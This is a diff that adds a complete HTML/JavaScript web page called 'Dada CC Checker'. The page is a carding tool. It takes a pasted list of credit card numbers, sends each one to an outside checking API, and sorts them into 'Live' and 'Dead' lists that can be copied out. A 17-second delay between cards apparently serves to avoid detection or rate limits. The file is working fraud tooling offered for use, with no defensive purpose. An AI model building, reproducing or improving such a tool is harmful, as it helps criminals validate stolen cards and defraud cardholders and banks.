@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Dada CC Checker</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" />
+  <style>
+    body {
+      font-family: "Inter", sans-serif;
+      /* Animated Gradient Background */
+      background: linear-gradient(-45deg, #0f172a, #1e293b, #0f172a, #334155);
+      background-size: 400% 400%;
+      animation: gradientBG 20s ease infinite;
+    }
+
+    @keyframes gradientBG {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+
+    .main-card {
+        /* Glassmorphism Effect */
+        background-color: rgba(30, 41, 59, 0.7);
+        backdrop-filter: blur(15px);
+        border: 1px solid rgba(100, 116, 139, 0.3);
+        animation: fadeIn 0.5s ease-out forwards;
+        opacity: 0;
+    }
+    
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    
+    /* Animation delay for staggered entry */
+    .main-card.delay-1 { animation-delay: 0.1s; }
+    .main-card.delay-2 { animation-delay: 0.2s; }
+    .main-card.delay-3 { animation-delay: 0.3s; }
+    .main-card.delay-4 { animation-delay: 0.4s; }
+
+    .input-bg {
+        background-color: #0f172a;
+    }
+
+    .status-box.is-checking {
+        animation: pulseGlow 2s infinite;
+    }
+    @keyframes pulseGlow {
+        0%, 100% { box-shadow: 0 0 10px rgba(34, 197, 94, 0.2); }
+        50% { box-shadow: 0 0 25px rgba(34, 197, 94, 0.5); }
+    }
+    
+    .count-update {
+        animation: countPulse 0.5s ease;
+    }
+    @keyframes countPulse {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.25); }
+        100% { transform: scale(1); }
+    }
+
+    .result-textarea::-webkit-scrollbar { width: 8px; }
+    .result-textarea::-webkit-scrollbar-track { background: transparent; }
+    .result-textarea::-webkit-scrollbar-thumb { background: rgba(100, 116, 139, 0.3); border-radius: 4px; }
+    .result-textarea::-webkit-scrollbar-thumb:hover { background: rgba(100, 116, 139, 0.5); }
+    
+    .swal2-popup {
+        background: #1e293b !important;
+        color: #e2e8f0 !important;
+        border: 1px solid rgba(100, 116, 139, 0.2) !important;
+    }
+    .swal2-title, .swal2-html-container { color: #f1f5f9 !important; }
+    .swal2-confirm { background-color: #22c55e !important; }
+  </style>
+</head>
+<body class="text-slate-200">
+  <header class="p-4 shadow-lg sticky top-0 z-10 border-b border-slate-700" style="background-color: rgba(30, 41, 59, 0.7); backdrop-filter: blur(15px);">
+    <div class="max-w-4xl mx-auto">
+      <h1 class="text-2xl font-bold text-white">Dada CC Checker</h1>
+    </div>
+  </header>
+
+  <div class="main-wrapper max-w-4xl mx-auto">
+    <main class="container p-4 flex flex-col gap-6 mt-6">
+      <div class="input-area main-card rounded-xl shadow-lg p-6 flex flex-col gap-4 border-slate-700 delay-1">
+          <div>
+            <label for="numbers" class="block mb-2 font-semibold text-lg text-slate-200">Credit Card Numbers</label>
+            <textarea id="numbers" rows="8" class="w-full p-3 input-bg border-2 border-slate-600 rounded-lg focus:ring-2 focus:ring-green-400 focus:border-green-400 focus:outline-none transition duration-300 resize-y" placeholder="Paste your card list here..."></textarea>
+          </div>
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <button id="check-btn" class="w-full py-3 px-5 text-lg font-bold rounded-lg transition-all duration-300 bg-green-500 text-slate-900 hover:bg-green-400 disabled:opacity-50 disabled:cursor-not-allowed hover:shadow-[0_0_15px_rgba(34,197,94,0.6)]">
+                <i class="fas fa-play mr-2"></i>Check
+            </button>
+            <button id="stop-check-btn" class="w-full py-3 px-5 text-lg font-bold rounded-lg transition-all duration-300 bg-slate-600 text-white hover:bg-slate-500 disabled:opacity-50 disabled:cursor-not-allowed" disabled>
+                <i class="fas fa-stop mr-2"></i>Stop
+            </button>
+          </div>
+      </div>
+      
+      <div class="status-area main-card rounded-xl shadow-lg p-6 flex flex-col gap-2 border-slate-700 delay-2">
+         <label for="result-output" class="block font-bold text-lg text-slate-200">Checking Status</label>
+         <textarea id="result-output" rows="6" readonly class="w-full p-3 input-bg border-2 border-slate-600 rounded-lg resize-y result-textarea status-box transition-all duration-300" placeholder="Your checking status will appear here..."></textarea>
+      </div>
+
+      <div class="results-area flex flex-col gap-6">
+        <div class="result-container main-card rounded-xl shadow-lg p-6 flex flex-col gap-2 border-slate-700 delay-3">
+          <div class="flex justify-between items-center">
+             <h2 class="text-xl font-bold text-green-400 flex items-center gap-2">
+                Live: <span id="live-count" class="ml-2 transition-transform duration-300">0</span>
+             </h2>
+             <button id="copy-live-btn" class="py-2 px-4 font-semibold rounded-lg transition-all duration-300 bg-slate-600 text-white hover:bg-slate-500">
+                Copy Live
+             </button>
+          </div>
+          <textarea id="live-numbers" class="result-textarea w-full h-40 p-2 input-bg border-2 border-slate-600 rounded-md resize-y" readonly></textarea>
+        </div>
+        <div class="result-container main-card rounded-xl shadow-lg p-6 flex flex-col gap-2 border-slate-700 delay-4">
+            <div class="flex justify-between items-center">
+             <h2 class="text-xl font-bold text-red-400 flex items-center gap-2">
+                Dead: <span id="dead-count" class="ml-2 transition-transform duration-300">0</span>
+             </h2>
+             <button id="copy-dead-btn" class="py-2 px-4 font-semibold rounded-lg transition-all duration-300 bg-slate-600 text-white hover:bg-slate-500">
+                Copy Dead
+             </button>
+          </div>
+          <textarea id="dead-numbers" class="result-textarea w-full h-40 p-2 input-bg border-2 border-slate-600 rounded-md resize-y" readonly></textarea>
+        </div>
+      </div>
+    </main>
+
+    <footer class="text-center py-6 mt-4">
+        <p class="text-sm text-slate-400 font-semibold">© 2025 Dada CC Checker. All Rights Reserved.</p>
+    </footer>
+  </div>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+    // --- DOM Elements ---
+    const checkBtn = document.getElementById('check-btn');
+    const stopCheckBtn = document.getElementById('stop-check-btn');
+    const numbersTextarea = document.getElementById('numbers');
+    const resultOutputTextarea = document.getElementById('result-output');
+    const liveNumbersTextarea = document.getElementById('live-numbers');
+    const deadNumbersTextarea = document.getElementById('dead-numbers');
+    const liveCountEl = document.getElementById('live-count');
+    const deadCountEl = document.getElementById('dead-count');
+    const copyLiveBtn = document.getElementById('copy-live-btn');
+    const copyDeadBtn = document.getElementById('copy-dead-btn');
+
+    // --- State Variables ---
+    let isChecking = false;
+
+    // --- Event Listeners ---
+    checkBtn.addEventListener('click', startChecking);
+    stopCheckBtn.addEventListener('click', () => {
+        isChecking = false;
+        stopCheckBtn.disabled = true;
+        checkBtn.disabled = false;
+        resultOutputTextarea.classList.remove('is-checking');
+        appendToStatusOutput("⏹️ Checking stopped by user.\n");
+    });
+    copyLiveBtn.addEventListener('click', () => copyResults('live'));
+    copyDeadBtn.addEventListener('click', () => copyResults('dead'));
+
+    // --- Core Functions ---
+    async function startChecking() {
+        isChecking = true;
+        
+        resultOutputTextarea.value = "";
+        liveNumbersTextarea.value = "";
+        deadNumbersTextarea.value = "";
+        updateSummaryCounts(0, 0);
+
+        const input = numbersTextarea.value.trim();
+        const cards = input.split("\n").filter(line => line.trim() !== "");
+
+        if (cards.length === 0) {
+            Swal.fire({ title: 'No Cards Found', text: 'Please paste your card list.', icon: 'warning' });
+            isChecking = false;
+            return;
+        }
+
+        checkBtn.disabled = true;
+        stopCheckBtn.disabled = false;
+        resultOutputTextarea.classList.add('is-checking');
+        
+        appendToStatusOutput(`▶️ Starting check of ${cards.length} cards...\n`);
+
+        for (let i = 0; i < cards.length; i++) {
+            if (!isChecking) break;
+
+            const card = cards[i].trim();
+            appendToStatusOutput(`Checking ${i + 1}/${cards.length}: ${card}\n`);
+            
+            try {
+                const apiURL = `https://checker-lake.vercel.app/api/check?card=${encodeURIComponent(card)}`;
+                const response = await fetch(apiURL);
+                if (!response.ok) throw new Error(`API Error: ${response.status}`);
+                
+                const data = await response.json();
+
+                if (data.status === 'APPROVED') {
+                    updateSummaryCounts(parseInt(liveCountEl.textContent) + 1, parseInt(deadCountEl.textContent));
+                    liveNumbersTextarea.value += card + "\n";
+                    appendToStatusOutput(`✅ Result: Live\n`);
+                } else if (data.status === 'DECLINED') {
+                    updateSummaryCounts(parseInt(liveCountEl.textContent), parseInt(deadCountEl.textContent) + 1);
+                    deadNumbersTextarea.value += card + "\n";
+                    appendToStatusOutput(`❌ Result: Dead\n`);
+                } else {
+                    throw new Error(data.message || 'Unknown status');
+                }
+            } catch (error) {
+                 updateSummaryCounts(parseInt(liveCountEl.textContent), parseInt(deadCountEl.textContent) + 1);
+                deadNumbersTextarea.value += card + "\n";
+                appendToStatusOutput(`❌ Result: Dead (${error.message})\n`);
+            }
+            
+            if (i < cards.length - 1 && isChecking) {
+                // The timer now runs silently in the background.
+                await silentCountdown(17);
+            }
+        }
+        
+        appendToStatusOutput("\n🏁 Checking Finished!\n");
+        isChecking = false;
+        checkBtn.disabled = false;
+        stopCheckBtn.disabled = true;
+        resultOutputTextarea.classList.remove('is-checking');
+        
+        if (!isChecking && cards.length > 0) {
+             Swal.fire({ title: 'Process Complete', text: 'All cards have been checked.', icon: 'success' });
+        }
+    }
+
+    function appendToStatusOutput(text) {
+        resultOutputTextarea.value += text;
+        resultOutputTextarea.scrollTop = resultOutputTextarea.scrollHeight;
+    }
+
+    function updateSummaryCounts(live, dead) {
+        if (live !== parseInt(liveCountEl.textContent)) {
+            liveCountEl.textContent = live;
+            liveCountEl.classList.add('count-update');
+            setTimeout(() => liveCountEl.classList.remove('count-update'), 500);
+        }
+        if (dead !== parseInt(deadCountEl.textContent)) {
+            deadCountEl.textContent = dead;
+            deadCountEl.classList.add('count-update');
+            setTimeout(() => deadCountEl.classList.remove('count-update'), 500);
+        }
+    }
+
+    function copyResults(type) {
+        const textarea = type === 'live' ? liveNumbersTextarea : deadNumbersTextarea;
+        const button = type === 'live' ? copyLiveBtn : copyDeadBtn;
+        
+        if (textarea.value.trim() === '') {
+            showToast('Nothing to copy!', 'warning');
+            return;
+        }
+
+        textarea.select();
+        document.execCommand('copy');
+        
+        const originalText = button.textContent;
+        button.innerHTML = '<i class="fas fa-check mr-1"></i> Copied!';
+        setTimeout(() => {
+            button.textContent = originalText;
+        }, 2000);
+
+        showToast(`${type.charAt(0).toUpperCase() + type.slice(1)} cards copied!`, 'success');
+    }
+
+    function showToast(title, icon) {
+        const Toast = Swal.mixin({
+            toast: true,
+            position: 'top-end',
+            showConfirmButton: false,
+            timer: 3000,
+            timerProgressBar: true,
+            didOpen: (toast) => {
+                toast.addEventListener('mouseenter', Swal.stopTimer)
+                toast.addEventListener('mouseleave', Swal.resumeTimer)
+            }
+        });
+        Toast.fire({ icon, title });
+    }
+    
+    // ** MODIFIED FUNCTION **
+    // This function creates a delay without updating the UI.
+    function silentCountdown(seconds) {
+        return new Promise((resolve) => {
+            if (!isChecking) { 
+                resolve(); 
+                return; 
+            }
+            setTimeout(() => {
+                resolve();
+            }, seconds * 1000);
+        });
+    }
+</script>
+</body>
+</html>
